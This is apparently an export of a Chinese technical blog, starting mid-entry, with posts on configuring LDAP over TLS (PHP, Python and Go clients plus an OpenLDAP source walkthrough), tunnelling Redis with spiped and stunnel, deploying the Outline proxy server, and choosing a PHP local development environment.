class="string">&quot;fail&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例代码二 (不推荐)</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;ldaps://127.0.0.1&quot;</span>; <span class="comment">#必须带ldaps协议头部，标识开启TLS</span></span><br><span class="line"><span class="variable">$port</span> = <span class="number">636</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;cn=username,ou=people,dc=test,dc=com&#x27;</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;123456&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> = ldap_connect(<span class="variable">$host</span>, <span class="variable">$port</span>);</span><br><span class="line"><span class="comment">#调试信息</span></span><br><span class="line">ldap_set_option(<span class="variable">$conn</span>, LDAP_OPT_PROTOCOL_VERSION, <span class="number">3</span>);</span><br><span class="line">ldap_set_option(<span class="literal">NULL</span>, LDAP_OPT_DEBUG_LEVEL, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 认证</span></span><br><span class="line"><span class="variable">$auth</span> = ldap_bind(<span class="variable">$conn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$auth</span> ? <span class="string">&quot;ok&quot;</span> : <span class="string">&quot;fail&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>Python客户端</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ldap</span><br><span class="line">ldap = <span class="string">&quot;ldap://127.0.0.1:389&quot;</span></span><br><span class="line">ldaps = <span class="string">&quot;ldaps://127.0.0.1:636&quot;</span></span><br><span class="line">ldapconn = ldap.initialize(ldaps)</span><br><span class="line"></span><br><span class="line">username = <span class="string">&#x27;cn=username,ou=people,dc=test,dc=com&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;123456&#x27;</span></span><br><span class="line">ldapconn.simple_bind_s(username, password) </span><br></pre></td></tr></table></figure><ul><li>Golang客户端</li></ul><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...省略</span></span><br><span class="line">l, err := Dial(<span class="string">&quot;tcp&quot;</span>, fmt.Sprintf(<span class="string">&quot;%s:%d&quot;</span>, <span class="string">&quot;ldap.example.com&quot;</span>, <span class="number">389</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> l.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意InsecureSkipVerify</span></span><br><span class="line">err = l.StartTLS(&amp;tls.Config&#123;InsecureSkipVerify: <span class="literal">true</span>&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x3-TLS分析"><a href="#0x3-TLS分析" class="headerlink" title="0x3 TLS分析"></a>0x3 TLS分析</h2><p>上述的配置基本实现了ldap通信数据加密需求，如果留意代码中注释的话，会对文章开头TLS端口636与代码中实际使用却不同。这个需要指出的是客户端语言实现不同导致的。</p><p>以PHP语言为例分析LDAP扩展中实现通信逻辑:</p><ul><li>使用636端口测试<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用文中的示例代码,端口修改成636</span></span><br><span class="line">输出结果</span><br><span class="line">`PHP Warning: ldap_start_tls(): Unable <span class="built_in">to</span> <span class="built_in">start</span> TLS: `</span><br></pre></td></tr></table></figure></li><li>关闭636端口测试<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">测试无影响，数据加密传输</span><br></pre></td></tr></table></figure></li></ul><p>在PHP文档ldap_start_tls函数评论中提到，ldaps和startTLS不是一回事，ldaps服务开放636端口，389端口支持加密和非加密数据传输; 并且ldaps不推荐使用。</p><p>PHP扩展ldap本质是调用openldap库中的函数实现，重点分析openldap中<code>ldap_connect</code>和<code>ldap_start_tls</code>两个函数实现。</p><p>笔者以openldap-2.4.47版本分析startTLS和ldaps实现及区别</p><p>openldap库目录结构:</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">openldap-2.4.47</span><br><span class="line">-<span class="ruby"> libraries/libldap/* <span class="comment">#PHP使用的ldap扩展底层依赖库</span></span></span><br><span class="line"><span class="ruby">- init.c   <span class="comment">#初始化操作</span></span></span><br><span class="line"><span class="ruby">- open.c.   <span class="comment">#连接操作</span></span></span><br><span class="line"><span class="ruby">- tls2.c.   <span class="comment">#TLS相关</span></span></span><br><span class="line"><span class="ruby">- options.c <span class="comment">#配置相关</span></span></span><br><span class="line"><span class="ruby">- url.c.    <span class="comment">#URL处理相关</span></span></span><br><span class="line"><span class="ruby">- request.c <span class="comment">#网络通信相关</span></span></span><br></pre></td></tr></table></figure><p>ldap_connect函数主要实现功能</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ldap初始化</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ldap_initialize</span><span class="params">( LDAP **ldp, LDAP_CONST <span class="keyword">char</span> *url )</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 设置ldp参数，如果启用sasl相关则初始化sasl相关设置, 加载系统配置文件</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ldap_create</span><span class="params">( LDAP **ldp )</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 解析URL，设置连接信息</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ldap_set_option</span><span class="params">(LDAP *ld, <span class="keyword">int</span> option, LDAP_CONST <span class="keyword">void</span> *invalue)</span></span></span><br></pre></td></tr></table></figure><p>ldap_start_tls函数主要实现功能</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ldap_start_tls函数调用底层ldap_start_tls_s函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ldap_start_tls_s</span><span class="params">(LDAP *ld, LDAPControl **serverctrls, LDAPControl **clientctrls)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//...省略</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认连接检查是否开启TLS </span></span><br><span class="line"><span class="keyword">if</span> ( ldap_tls_inplace( ld ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> LDAP_LOCAL_ERROR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 建立连接</span></span><br><span class="line">rc = ldap_extended_operation_s( ld, LDAP_EXOP_START_TLS,</span><br><span class="line"><span class="literal">NULL</span>, serverctrls, clientctrls, &amp;rspoid, &amp;rspdata );</span><br><span class="line"><span class="comment">//...省略</span></span><br><span class="line"><span class="keyword">if</span> ( rc == LDAP_SUCCESS ) &#123;</span><br><span class="line"><span class="comment">// 协商TLS通信会话</span></span><br><span class="line">rc = ldap_int_tls_start( ld, ld-&gt;ld_defconn, <span class="literal">NULL</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> rc;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ldap使用流程对比:</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">ldap_connect</span> -&gt;</span> ldap_bind</span><br><span class="line"><span class="function"><span class="title">ldap_connect</span> -&gt;</span> <span class="function"><span class="title">ldap_start_tls</span> -&gt;</span> ldap_bind</span><br></pre></td></tr></table></figure><p>ldap_start_tls在bind认证前开启TLS验证，ldaps是在ldap_bind操作时再初始化TLS会话，身份认证操作。两种操作在底层实现相差不大，主要是服务端389端口支持加密和非加密两种功能。</p><p>slapd服务端连接判断</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">Connection * <span class="title">connection_init</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">ber_socket_t</span> s,</span></span></span><br><span class="line"><span class="function"><span class="params">Listener *listener,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">const</span> <span class="keyword">char</span>* dnsname,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">const</span> <span class="keyword">char</span>* peername,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">slap_ssf_t</span> ssf,</span></span></span><br><span class="line"><span class="function"><span class="params">struct berval *authid</span></span></span><br><span class="line"><span class="function"><span class="params">LDAP_PF_LOCAL_SENDMSG_ARG(struct berval *peerbv))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//...省略</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_TLS</span></span><br><span class="line"><span class="comment">// TLS连接判断</span></span><br><span class="line"><span class="keyword">if</span> ( flags &amp; CONN_IS_TLS ) &#123;</span><br><span class="line">c-&gt;c_is_tls = <span class="number">1</span>;</span><br><span class="line">c-&gt;c_needs_tls_accept = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">c-&gt;c_is_tls = <span class="number">0</span>;</span><br><span class="line">c-&gt;c_needs_tls_accept = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">slap_sasl_open( c, <span class="number">0</span> );</span><br><span class="line">slap_sasl_external( c, ssf, authid );</span><br><span class="line"></span><br><span class="line">slapd_add_internal( s, <span class="number">1</span> );</span><br><span class="line"></span><br><span class="line">backend_connection_init(c);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...省略</span></span><br></pre></td></tr></table></figure><p>有一点需要注意的是客户端使用ldap_start_tls函数时，会自动加载本地目录<code>/etc/openldap/ldap.conf</code>文件, 具体参考<a href="https://github.com/php/php-src/blob/master/ext/ldap/tests/README.md">PHP测试说明</a>。其中ldap.conf配置内容参考<code>man ldap.conf</code>命令说明及<a href="http://www.openldap.org/doc/admin24/tls.html">官方文档</a>。</p><h2 id="0x4-参考"><a href="#0x4-参考" class="headerlink" title="0x4 参考"></a>0x4 参考</h2><ol><li><a href="http://www.openldap.org/doc/admin24/tls.html">openldap TLS文档</a></li><li><a href="https://github.com/osixia/docker-openldap#TLS">openldap docker</a></li><li><a href="https://www.php.net/manual/en/function.ldap-start-tls.php">php TLS使用</a></li><li><a href="https://github.com/go-ldap/ldap/blob/master/example_test.go">golang-ldap库</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ldap </tag>
            
            <tag> tls </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用TLS加密通信数据</title>
      <link href="2019/08/23/%E4%BD%BF%E7%94%A8TLS%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1%E6%95%B0%E6%8D%AE/"/>
      <url>2019/08/23/%E4%BD%BF%E7%94%A8TLS%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<p>随着某些业务安全性要求提高，敏感数据经过网络时需要加密传输。如MySQL, Redis这些协议在网络中传输是可以通过抓包分析到数据包内部信息的。</p><p>本文只是简单记录使用TLS加密某些软件数据流使用，本质上无论spiped还是stunnel都是通过建立隧道的方式进行安全传输。spiped是Redis官方推荐一个采用AES加密算法开源工具，该工具作者是OpenBSD的安全协会成员；stunnel则是一款采用非对称加密算法且闭源的工具，支持多个服务使用，相对spipped来说可以在多个场景使用。</p><p><a href="https://itschr.is/remote-redis-spiped-vs-stunnel">Remote Redis: Spiped vs Stunnel</a>这篇文章对比了两款工具的性能，感兴趣的可以自行验证。</p><h2 id="示例"><a href="#示例" class="headerlink" title="#示例"></a>#示例</h2><p>spipped</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成密钥</span></span><br><span class="line">dd <span class="attribute">if</span>=/dev/urandom <span class="attribute">bs</span>=128 <span class="attribute">count</span>=1 &gt; secret.key</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地运行 (-e 加密 -s 源 -t 目标)</span></span><br><span class="line">spiped -e -s <span class="string">&#x27;127.0.0.1:6379&#x27;</span> -t 服务器IP:8000 -k secret.key</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务端运行 (-d 解密)</span></span><br><span class="line">spiped -d -s <span class="string">&#x27;0.0.0.0:8000&#x27;</span> -t <span class="string">&#x27;127.0.0.1:6379&#x27;</span> -k secret.key</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看帮助 (连接树，超时设置)</span></span><br><span class="line">spiped -h</span><br></pre></td></tr></table></figure><p>stunnel</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/stunnel/redis-client.conf</span></span><br><span class="line"><span class="attr">cert</span> = /etc/stunnel/private.pem</span><br><span class="line"><span class="attr">client</span> = <span class="literal">yes</span></span><br><span class="line"><span class="attr">pid</span> = /var/run/stunnel.pid</span><br><span class="line"><span class="section">[redis]</span></span><br><span class="line"><span class="attr">accept</span> = <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6379</span></span><br><span class="line"><span class="attr">connect</span> = 服务端IP:<span class="number">6380</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># /etc/stunnel/redis-server.conf</span></span><br><span class="line"><span class="attr">cert</span> = /etc/stunnel/private.pem</span><br><span class="line"><span class="attr">pid</span> = /var/run/stunnel.pid</span><br><span class="line"><span class="section">[redis]</span></span><br><span class="line"><span class="attr">accept</span> = 服务端IP:<span class="number">6380</span></span><br><span class="line"><span class="attr">connect</span> = <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6379</span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="#参考"></a>#参考</h2><p><a href="http://www.tarsnap.com/spiped.html">spiped加密通信</a><br><a href="https://www.stunnel.org/static/stunnel.html">stunnel文档</a><br><a href="https://itschr.is/remote-redis-spiped-vs-stunnel">spiped vs stunnel性能对比</a><br><a href="https://laoyur.com/archives/183">使用STUNNEL加密REDIS通信</a><br><a href="https://zhusas.github.io/2018/08/01/mysql-ssl">MySQL启用的SSL连接的思考与实践</a></p>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tls </tag>
            
            <tag> spiped </tag>
            
            <tag> stunnel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>outline部署实践</title>
      <link href="2019/08/02/outline%E9%83%A8%E7%BD%B2%E5%AE%9E%E8%B7%B5/"/>
      <url>2019/08/02/outline%E9%83%A8%E7%BD%B2%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<p>outline是另一个爬墙的方案，主要采用docker的形式运行shadowsocks提供服务，是<a href="https://github.com/Jigsaw-Code">jigsaw</a>团队折腾出来一个比较友好方案。outline由客户端，服务端管理和shadowbox(加强版的ss)组成，其中客户端支持win/linux/mac/android/iOS平台。截止目前<a href="https://github.com/Jigsaw-Code/outline-client/releases">客户端</a>发版617次, 基本满足日常划水了。</p><p>outline优点</p><ul><li>支持全平台</li><li>docker化部署</li><li>兼容shadowsocks客户端</li><li>支持API</li><li>支持监控</li><li>TypeScript实现</li></ul><h2 id="0x1-部署"><a href="#0x1-部署" class="headerlink" title="0x1 部署"></a>0x1 部署</h2><p>首先你要有一台服务器来部署服务，outline manager服务端软件提供四种方案；其中前三种是DigitalOcean、Google Cloud和AWS三家云厂商。貌似DigitalOcean可以低至5刀每月，最后一种是自建方案，推荐有vps的用户使用。</p><p>服务端配置:</p><ul><li><p>下载安装脚本</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="regexp">//</span>raw.githubusercontent.com<span class="regexp">/Jigsaw-Code/</span>outline-server<span class="regexp">/master/</span>src<span class="regexp">/server_manager/i</span>nstall_scripts/install_server.sh</span><br></pre></td></tr></table></figure></li><li><p>配置脚本</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#查看参数</span><br><span class="line">sh install_server.sh -h</span><br><span class="line"></span><br><span class="line">输出:</span><br><span class="line">Usage: install_server.sh [--hostname &lt;hostname&gt;] [--api-port &lt;port&gt;] [--keys-port &lt;port&gt;]</span><br><span class="line"></span><br><span class="line">  --hostname   访问域名</span><br><span class="line">  --api-port   API管理端口</span><br><span class="line">  --keys-port  shadowsocks服务端口(兼容ss客户端)</span><br></pre></td></tr></table></figure></li><li><p>执行安装</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 环境需要提前安装docker</span><br><span class="line">sh install_server.sh --hostname 域名 --api-port 80 --keys-port 443</span><br><span class="line"></span><br><span class="line"># docker镜像安装</span><br><span class="line">quay.io/outline/shadowbox =&gt; 封装的shadowsocks镜像</span><br><span class="line">docker.io/v2tec/watchtower=&gt; docker容器监控镜像</span><br></pre></td></tr></table></figure></li><li><p>配置<br>脚本安装完成后，终端中会输出如下信息。注意apiUlr的json数据, 服务端管理客户端需要这个。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"></span><br><span class="line">To manage your Outline server, please copy the following line (including curly</span><br><span class="line">brackets) into Step 2 of the Outline Manager interface:</span><br><span class="line"></span><br><span class="line">&#123;&quot;apiUrl&quot;:&quot;https://www.demo.com:33104/pHFagvPGtiprJ4gAVRcSVQ&quot;,&quot;certSha256&quot;:&quot;E71C445A78CF6D37D3959AE190D1E350425D5FB956232228FDEBEDD8CE689CC4&quot;&#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure></li><li><p>服务端客户端配置<br>粘贴上述apiUlr json字符到客户端中即可添加</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* 分享链接中KEY需要解码，复制出`ss:<span class="regexp">//</span>`字符, 使用<span class="string">&quot;ss协议工具&quot;</span>解密</span><br></pre></td></tr></table></figure></li><li><p>outline server配置文件(docker容器)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">应用目录: </span><br><span class="line"><span class="regexp">/root/</span>shadowbox</span><br><span class="line"><span class="regexp">/root/</span>shadowbox<span class="regexp">/bin/</span>outline-ss-server</span><br><span class="line"><span class="regexp">/root/</span>shadowbox<span class="regexp">/bin/</span>prometheus</span><br><span class="line"></span><br><span class="line">配置目录:</span><br><span class="line"><span class="regexp">/opt/</span>outline</span><br><span class="line"><span class="regexp">/opt/</span>outline<span class="regexp">/persisted-state/</span>shadowbox_config.json</span><br><span class="line"><span class="regexp">/opt/</span>outline<span class="regexp">/persisted-state/</span>shadowbox_server_config.json</span><br><span class="line"><span class="regexp">/opt/</span>outline<span class="regexp">/persisted-state/</span>outline-ss-server/config.yml</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x2-项目分析"><a href="#0x2-项目分析" class="headerlink" title="0x2 项目分析"></a>0x2 项目分析</h2><p> outline这个项目前身是<a href="https://github.com/uProxy">uProxy</a>, outline项目主要分为outline-client、outline-server和outline-ss-server三个工程。outline-client采用electron和typescript开发客户端，移动端配置相对简单，github上有iOS客户端<strong>ipa</strong>文件。outline-ss-server工程使用golang重新实现shadowsocks功能，相对<a href="https://github.com/shadowsocks/go-shadowsocks2">go-shadowsocks2</a>多了端口复用和监控上报功能，更多详情参考<a href="https://github.com/Jigsaw-Code/outline-ss-server">官方说明</a>。</p><p>outline核心是outline-server工程, 包装outline-ss-server作为一个核心代理服务。</p><p>项目模块:</p><ul><li><p>shadowbox</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shadowbox提供outline-ss-server服务docker镜像构建、配置加载和API服务实现</span><br></pre></td></tr></table></figure></li><li><p>server_manager</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outline服务端管理软件，和outline-client类型都是采用electron实现GUI界面，调用API接口操作</span><br></pre></td></tr></table></figure></li><li><p>sentry_webhook</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">日志服务上报，利用Google cloud function功能配合https://sentry.io/outlinevpn平台上报数据</span><br></pre></td></tr></table></figure></li><li><p>metrics_server</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">元数据上报，利用Google cloud function功能实现数据上报。outline-server可以设置上报数据开关。具体参考shadowbox_server_config.json配置文件。如果Docker环境变量未设置SB_METRICS_URL值，系统默认上报地址是https://metrics-prod.uproxy.org, 无法通过outline-server修改上报地址。数据上报也是outline被诟病的地方。</span><br></pre></td></tr></table></figure></li></ul><p>outline的优势在于整体配置简单，有自成一体的客户端全家桶，使用方便。从本质上来说，都只是在shadowsocks上套了一层壳而已。</p><h2 id="0x3-参考"><a href="#0x3-参考" class="headerlink" title="0x3 参考"></a>0x3 参考</h2><ul><li><a href="https://github.com/Jigsaw-Code/outline-server">官方仓库</a></li><li><a href="https://github.com/Jigsaw-Code/outline-server/tree/master/src/shadowbox">官方文档</a></li><li><a href="https://techcrunch.cn/2018/03/23/alphabets-outline-lets-you-build-your-own-vpn/">新闻报道</a></li><li><a href="https://github.com/xydche/ss-link-decoder">ss协议解析工具</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> outline </tag>
            
            <tag> 酸酸乳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP本地开发环境浅析</title>
      <link href="2019/07/07/PHP%E6%9C%AC%E5%9C%B0%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%B5%85%E6%9E%90/"/>
      <url>2019/07/07/PHP%E6%9C%AC%E5%9C%B0%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%B5%85%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>PHP生态发展十几年了，目前依旧在业务开发语言中占一席之地。大部分公司业务开发都会要求统一开发风格，以便业务更好的迭代重构。PHP由于是解释性语言，前期开发环境配置简单；依赖的扩展及三方服务并不复杂，但随着业务的发展，引入的三方服务不断迭代更新就会造成开发人员的环境不统一，容易出现本地环境测试没有问题，一上线就出现各种奇怪的问题。</p><p>笔者总结下目前PHP本地开放环境趋势，大致有三类</p><h2 id="集成环境"><a href="#集成环境" class="headerlink" title="#集成环境"></a>#集成环境</h2><p>开发使用诸如phpstudy、xampp、mamp等集成环境，这些集成环境基本上满足PHP开发日常。这类集成环境在统一配置PHP扩展比较麻烦，尤其涉及windows环境扩展更加繁琐。</p><h2 id="phpbrew自由式"><a href="#phpbrew自由式" class="headerlink" title="#phpbrew自由式"></a>#phpbrew自由式</h2><p>phpbrew是一个PHP多版本包管理软件，支持多版本，自由配置扩展等便捷操作。笔者比较推荐使用这种方式开发PHP项目，phpbrew在mac/linux环境使用基本满足需求，windows开发环境配置phpbrew比较麻烦一些。微软这几年推进windows shell环境的使用，相信过几年三端开发环境差异性会逐渐缩小。</p><p>示例:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装特定版本</span></span><br><span class="line"><span class="attribute">phpbrew</span> install <span class="number">7</span>.<span class="number">3</span>.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置PHP版本</span></span><br><span class="line"><span class="attribute">phpbrew</span> use <span class="number">7</span>.<span class="number">3</span>.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#扩展安装</span></span><br><span class="line"><span class="attribute">phpbrew</span>  ext install ldap</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭phpbrew</span></span><br><span class="line"><span class="attribute">phpbrew</span> <span class="literal">off</span></span><br></pre></td></tr></table></figure><h2 id="Laravel-homestead"><a href="#Laravel-homestead" class="headerlink" title="#Laravel homestead"></a>#Laravel homestead</h2><p>laravel homestead是laravel官方出品的开发环境方案，通过vagrant加载配置文件初始化PHP项目所需要的环境。vagrant使用virtualbox等虚拟机方式加载laravel/homestead box镜像的方式统一项目中研发人员的开发环境，该方案属于笨重的方式。box镜像文件比较大、需要配置homestead.yaml和需要安装virtualbox没有那么灵活。企业级开发可以使用该方案，不过homestead支持其他框架么，如Yii2/Symfony/CI？</p><h2 id="Docker化"><a href="#Docker化" class="headerlink" title="#Docker化"></a>#Docker化</h2><p>一切服务皆可docker？随着微服务化、k8s和云上服务等技术兴起，docker这个容器也随之成了研发人员常常讨论的话题。docker优点主要在于容器化、隔离型、易于管理和轻便性为主。PHP在docker的生态环静发展也不错，主流镜像基本都有。<br>PHP这里采用docker主要存在两个方面：一是docker构建业务代码；二是docker构建本地开发的环境。前者通过gitlab中的ci脚本统一构建代码运行环境，便于运维管理发布回滚等操作。后者主要是便于开发人员本地搭建环境节省<strong>大量时间</strong>。很多时候只是验证某些服务的场景，手动搭建环境会遇到很多问题；手动搭建唯一好处就是可以非常了解系统的运行及系统的官方手册 